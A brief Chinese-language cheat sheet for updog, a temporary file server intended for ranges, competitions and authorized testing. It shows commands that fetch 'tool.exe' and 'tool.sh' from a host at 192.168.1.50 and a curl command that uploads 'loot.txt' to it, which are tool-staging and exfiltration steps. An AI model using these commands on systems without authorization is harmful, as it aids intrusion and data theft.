# updog 临时文件服务

updog 是带上传功能的临时 HTTP 文件服务。它适合靶场、比赛和授权测试里快速传文件，比默认 `python -m http.server` 多了上传能力。

## 启动服务

```bash
updog -p 8000
```

```bash
updog -p 8000 --password pass123
```

```bash
updog -p 8000 --directory ./share
```

## 下载文件

```bash
curl -O http://192.168.1.50:8000/tool.exe
```

```bash
wget http://192.168.1.50:8000/tool.sh -O /tmp/tool.sh
```

```bash
powershell -Command "iwr http://192.168.1.50:8000/tool.exe -OutFile tool.exe"
```

## 上传文件

```bash
curl -F "file=@loot.txt" http://192.168.1.50:8000/upload
```

临时文件服务最好放单独目录，结束后立刻关闭。需要共享凭据或报告材料时，至少加密码并限制网段。
